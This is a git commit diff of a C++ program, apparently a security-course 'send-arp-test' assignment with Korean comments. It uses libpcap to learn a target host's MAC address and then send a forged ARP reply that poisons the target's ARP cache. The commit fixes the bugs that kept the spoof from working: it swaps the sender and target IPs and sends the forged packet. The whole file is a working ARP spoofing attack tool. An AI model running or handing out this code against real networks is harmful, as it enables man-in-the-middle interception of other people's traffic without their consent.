8e65e8007278da3bc873b717c30e6f049b84041d
cryptogus <60291830+cryptogus@users.noreply.github.com>
2022-08-16 00:06:38 +0900

    code error 수정

--- main.cpp
+++ main.cpp
@@ -20,20 +20,20 @@ using namespace std; //For string get_mac_address(void)
 
 void getMyIpAddr(char* ip_addr, char* netInterface)
 {
-	struct ifreq ifr;
-	int s;
+   struct ifreq ifr;
+   int s;
 
-	s = socket(AF_INET, SOCK_DGRAM, 0);
-	strncpy(ifr.ifr_name, netInterface, IFNAMSIZ);
+   s = socket(AF_INET, SOCK_DGRAM, 0);
+   strncpy(ifr.ifr_name, netInterface, IFNAMSIZ);
 
-	if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
-		printf("Error");
-	} else {
-		inet_ntop(AF_INET, 
+   if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
+      printf("Error");
+   } else {
+      inet_ntop(AF_INET, 
             ifr.ifr_addr.sa_data+2,
-			ip_addr,
+         ip_addr,
             sizeof(struct sockaddr));
-	}
+   }
 }
 
 string get_mac_address(void) { //출처: https://muabow.tistory.com/287 [이름 같은게 중요 한가요:티스토리
@@ -103,53 +103,59 @@ string get_mac_address(void) { //출처: https://muabow.tistory.com/287 [이름 
 
 #pragma pack(push, 1)
 struct EthArpPacket final {
-	EthHdr eth_;
-	ArpHdr arp_;
+   EthHdr eth_;
+   ArpHdr arp_;
 };
 #pragma pack(pop)
 
 void usage() {
-	printf("syntax: send-arp-test <interface>\n");
-	printf("sample: send-arp-test wlan0\n");
+   printf("syntax: send-arp-test <interface>\n");
+   printf("sample: send-arp-test wlan0\n");
 }
 
 int main(int argc, char* argv[]) {
-	if (argc == 0) {
-		usage();
-		return -1;
-	}
+   if (argc == 0) {
+      usage();
+      return -1;
+   }
     
     char myIP[20] = {0,};
 
-	char* dev = argv[1];
-	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
-	if (handle == nullptr) {
-		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
-		return -1;
-	}
+   char* dev = argv[1];
+   char errbuf[PCAP_ERRBUF_SIZE];
+   pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
+   if (handle == nullptr) {
+      fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
+      return -1;
+   }
     
-	EthArpPacket packet;
+   EthArpPacket packet;
     
     getMyIpAddr(myIP, dev);
     printf("MY IP: %s\n",myIP);//내 아이피 확인
-	printf("dev: %s\n",dev); //ens~~~
+   printf("dev: %s\n",dev); //ens~~~
     //printf("d= %s\n",argv[2]);
     //printf("d= %s\n",argv[3]);
     ///////////////////////////////////정보얻어오기////////////////
     packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); //destination
-	packet.eth_.smac_ = Mac(get_mac_address()); //  source mac
-	packet.eth_.type_ = htons(EthHdr::Arp);
+   packet.eth_.smac_ = Mac(get_mac_address()); //  source mac
+   packet.eth_.type_ = htons(EthHdr::Arp);
 
-	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-	packet.arp_.pro_ = htons(EthHdr::Ip4);
-	packet.arp_.hln_ = Mac::SIZE;
-	packet.arp_.pln_ = Ip::SIZE;
-	packet.arp_.op_ = htons(ArpHdr::Request);
-	packet.arp_.smac_ = Mac(get_mac_address()); //sendermac
-	packet.arp_.sip_ = htonl(Ip(myIP));
-	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
-	packet.arp_.tip_ = htonl(Ip(argv[2]));
+   packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+   packet.arp_.pro_ = htons(EthHdr::Ip4);
+   packet.arp_.hln_ = Mac::SIZE;
+   packet.arp_.pln_ = Ip::SIZE;
+   packet.arp_.op_ = htons(ArpHdr::Request);
+   packet.arp_.smac_ = Mac(get_mac_address()); //sendermac
+   packet.arp_.sip_ = htonl(Ip(myIP));
+   packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
+   packet.arp_.tip_ = htonl(Ip(argv[2]));
+
+   int res_send = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+   if (res_send != 0) {
+      fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_send, pcap_geterr(handle));
+   }
+
 
     //// sender mac 받아오기////
     Mac attack;
@@ -160,40 +166,42 @@ int main(int argc, char* argv[]) {
         
         EthArpPacket* NewPacket;
         NewPacket = (EthArpPacket*)pkt_data;
-        
-        uint32_t sIp = htonl((uint32_t)NewPacket->arp_.sip_);
-        //printf("%d\n",sIp);
-        char sip[40] = {0,};
-        sprintf(sip, "%d.%d.%d.%d", (sIp >> 24) &0xff, (sIp >> 16) & 0xff, (sIp >>8) & 0xff, sIp & 0xff);
-        printf("받아온 패킷 아이피: %s\n",sip);
-        
-        if(strncmp(sip, argv[2], strlen(argv[2])) == 0){ //공격대상의 아이피와 같은 응답이 오면 같이오는 공격대상의 맥주소 저장
-					
-		    attack = NewPacket->arp_.smac_;
-			break;
+        if(ntohs(NewPacket->eth_.type_) == 0x0806){
+            uint32_t sIp = htonl((uint32_t)NewPacket->arp_.sip_);
+            //printf("%d\n",sIp);
+            char sip[40] = {0,};
+            sprintf(sip, 
+            "%d.%d.%d.%d", 
+            (sIp >> 24) &0xff, (sIp >> 16) & 0xff, (sIp >>8) & 0xff, sIp & 0xff);
+            printf("받아온 패킷 아이피: %s\n",sip);
+            
+            if(strncmp(sip, argv[2], strlen(argv[2])) == 0){ //공격대상의 아이피와 같은 응답이 오면 같이오는 공격대상의 맥주소 저장      
+                attack = NewPacket->arp_.smac_;
+                break;
+            }
         }
     }
     //////////////공격//////////////////////////////
-	printf("Attack\n");
+    printf("Attack\n");
     EthArpPacket packet1;
     packet1.eth_.type_ = htons(EthHdr::Arp);
-	packet1.eth_.smac_ = Mac(get_mac_address());
+    packet1.eth_.smac_ = Mac(get_mac_address());
     packet1.eth_.dmac_ = attack;
     packet1.arp_.tmac_ = attack;
     
-    packet1.arp_.op_ = htons(ArpHdr::Reply);
-	packet1.arp_.hrd_ = htons(ArpHdr::ETHER);
-	packet1.arp_.pro_ = htons(EthHdr::Ip4);
-	packet1.arp_.hln_ = Mac::SIZE;
-	packet1.arp_.pln_ = Ip::SIZE;
-    packet1.arp_.sip_ = htonl(Ip(argv[2]));
-	packet1.arp_.smac_ = Mac(get_mac_address());
-	packet1.arp_.tip_ = htonl(Ip(argv[3]));
+   packet1.arp_.op_ = htons(ArpHdr::Reply);
+   packet1.arp_.hrd_ = htons(ArpHdr::ETHER);
+   packet1.arp_.pro_ = htons(EthHdr::Ip4);
+   packet1.arp_.hln_ = Mac::SIZE;
+   packet1.arp_.pln_ = Ip::SIZE;
+   packet1.arp_.sip_ = htonl(Ip(argv[3]));
+   packet1.arp_.smac_ = Mac(get_mac_address());
+   packet1.arp_.tip_ = htonl(Ip(argv[2]));
 
-	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-	if (res != 0) {
-		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-	}
+   int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet1), sizeof(EthArpPacket));
+   if (res != 0) {
+      fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+   }
 
-	pcap_close(handle);
+   pcap_close(handle);
 }
